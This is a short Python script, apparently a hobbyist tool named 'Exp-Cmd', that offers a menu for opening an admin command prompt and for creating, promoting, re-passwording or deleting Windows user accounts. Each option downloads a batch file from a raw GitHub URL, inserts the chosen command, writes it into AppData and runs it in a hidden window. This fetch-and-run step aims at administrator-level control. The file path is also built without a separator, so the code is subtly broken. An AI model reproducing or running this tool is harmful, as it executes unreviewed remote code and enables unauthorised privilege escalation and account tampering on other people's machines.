import os
import requests
import subprocess

usr = os.getenv('username')
appdata = os.getenv('appdata')

def RunCMDadm(c):
    code = requests.get('https://raw.githubusercontent.com/wib-wolfix/exp-cmd/main/modules/cmd_batch.bat').text
    code = code.replace('の▥♣♡☎☆', c)
    i = appdata+'zzhgbhzbhg.bat'
    open(i,'w').write(code)
    subprocess.call(i,creationflags=0x08000000)

def StartPrint():
    print("""
___________                        _________              .___
\_   _____/__  _________           \_   ___ \  _____    __| _/
 |    __)_\  \/  /\____ \   ______ /    \  \/ /     \  / __ | 
 |        \>    < |  |_> > /_____/ \     \___|  Y Y  \/ /_/ | 
/_______  /__/\_ \|   __/           \______  /__|_|  /\____ | 
        \/      \/|__|                     \/      \/      \/ 
                            BETA
        By wolfix (github: https://github.com/ytbwolfix)
    """)

def Main():
    StartPrint()
    print("""
[1] = Admin CMD
[2] = Create user (admin or no admin)
[3] = Change user password
[4] = Delete user account
    """)
    x = input('Choice: ')
    if x == "1":
        RunCMDadm('cmd')
    elif x == "2":
        user = input('Username: ')
        pwd = input('Password: ')
        adm = input('Admin (yes,no): ')
        RunCMDadm('net user '+user+' '+pwd+' /add')
        if adm == 'yes':
            print('Admin is on maintenance !')
            RunCMDadm('net localgroup administrators '+user+' /add')
    elif x == "3":
        user = input('Username: ')
        pwd = input('New password: ')
        RunCMDadm('net user '+user+' '+pwd)
    elif x == "4":
        user = input('Username: ')
        RunCMDadm('net user '+user+' /delete')

Main()
